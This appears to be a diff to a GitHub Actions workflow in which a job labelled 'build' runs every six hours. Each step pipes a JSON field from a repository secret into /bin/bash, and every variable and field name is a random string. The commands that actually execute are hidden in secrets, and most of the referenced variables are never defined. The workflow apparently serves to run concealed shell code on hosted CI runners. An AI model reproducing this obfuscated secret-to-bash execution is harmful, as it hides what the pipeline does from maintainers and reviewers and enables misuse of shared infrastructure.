@@ -1,26 +1,28 @@
 name: dadanmaxo
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 1/6 * * *'
-
-jobs:  # 8422
+    - cron: '22 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dadanmaxo
         env:
-          habdh55: ${{ secrets.habdh55 }}
+          aqir2364: ${{ secrets.aqir2364 }}
         run: |
-          echo $habdh55 | jq -r .nlmxo89015 | /bin/bash
-          echo $e62650 | jq -r .kinh1223 | /bin/bash
-          echo $wwoaz60 | jq -r .vbzg12051 | /bin/bash
-          echo $uzjj9301 | jq -r .qcr8265 | /bin/bash
-          echo $oqq6 | jq -r .ndan3 | /bin/bash
-          echo $grasm956 | jq -r .o788 | /bin/bash
-          echo $pcdiv924 | jq -r .ol7994 | /bin/bash
-          echo $b631 | jq -r .idvqz22952 | /bin/bash
+          echo $aqir2364 | jq -r .it21 | /bin/bash
+          echo $jxja6 | jq -r .vik57094 | /bin/bash
+          echo $otqqi46 | jq -r .zi76 | /bin/bash
+          echo $t73 | jq -r .neo908 | /bin/bash
+          echo $uh6 | jq -r .st7 | /bin/bash
+          echo $th11 | jq -r .wedi902 | /bin/bash
+          echo $ukm17206 | jq -r .xd144 | /bin/bash
+          echo $yp93439 | jq -r .x25738 | /bin/bash
+          echo $u70 | jq -r .r6648 | /bin/bash
+          echo $tpzgf22460 | jq -r .ne15349 | /bin/bash
+          echo $ven7 | jq -r .h1479 | /bin/bash
+          echo $kpgy35 | jq -r .zelt137 | /bin/bash
+          echo $jp12614 | jq -r .itfpc8009 | /bin/bash
 
